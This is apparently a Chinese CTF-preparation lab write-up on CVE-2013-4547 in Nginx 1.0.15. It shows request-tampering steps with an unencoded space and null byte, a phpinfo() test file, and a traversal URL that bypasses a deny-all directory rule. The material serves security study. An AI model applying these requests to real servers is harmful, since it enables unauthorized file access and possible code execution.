来测试下，这次测试在Nginx/1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。

测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：http://192.168.56.101/test.htmlAAAphp ,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如下图所示：

修改请求

修改完毕后Forward该请求，在浏览器中看到：

成功显示图片

我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。

继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，文件内容为：

  <?php phpinfo() ?>

用Burp Suite抓包并修改，原本的URL是：http://192.168.56.101/test.jpg…php ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示：

修改请求

修改完毕后Forword该请求，在浏览器中看到：

  Access denied.

好吧，又是这个。打开Nginx的错误日志，在其中也可以看到：

  FastCGI sent in stderr: "Access to the script '/usr/local/nginx/html/test.jpg ' has been denied (see security.limit_extensions)" while reading response header from upstream, client: 192.168.56.102, server: localhost, request: "GET /test.jpg .php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php5-fpm.sock:", host: "192.168.56.101"

这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。

但不知为何，不管我怎样设置，php都不肯把“test.jpg ”当做php文件执行。看来“security.limit_extensions”威力强大，一招破万法。

CVE-2013-4547还可以用于绕过访问限制，虽然和文件解析漏洞无关，但也记录在这里。

首先在网站根目录下新建一个目录，命名为protected，在目录protected中新建文件s.html，内容随意。然后在Nginx的配置文件中写上：

  location /protected/ {
    deny all;
  }
以禁止该目录的访问。接着在网站根目录下新建一个目录，名为“test ”，目录名的最后一个字符是空格，该目录用于触发漏洞。最后来进行验证，直接访问：

  http://127.0.0.1/protected/s.html
返回“403 Forbidden”。利用漏洞访问：

  http://127.0.0.1/test /../protected/s.html
成功访问到文件s.html。注意上示URL中的空格，不要将空格编码。

为成功利用漏洞，我们在测试中准备了名字以空格结尾的文件和目录，这是因为在linux中，文件名是可以以空格结尾的。若不准备这样的文件，漏洞可以成功触发，但结果却是404，找不到类似“test.jpg ”这样的文件。而在Windows中，文件名不能以空格结尾，所以Windows程序遇到文件名“test.jpg ”会自动去掉最后的空格，等同于访问“test.jpg”，基于这样的原因，这一漏洞在Windows中会很容易利用。




以上是根据这次字节跳动的ctf比赛而找的一些知识点，看了很多大佬博客，所以我觉得应该挺全了吧算是。

参考
https://www.jianshu.com/p/74ea9f0860d2
https://www.cnblogs.com/taosiyu/p/14827849.html

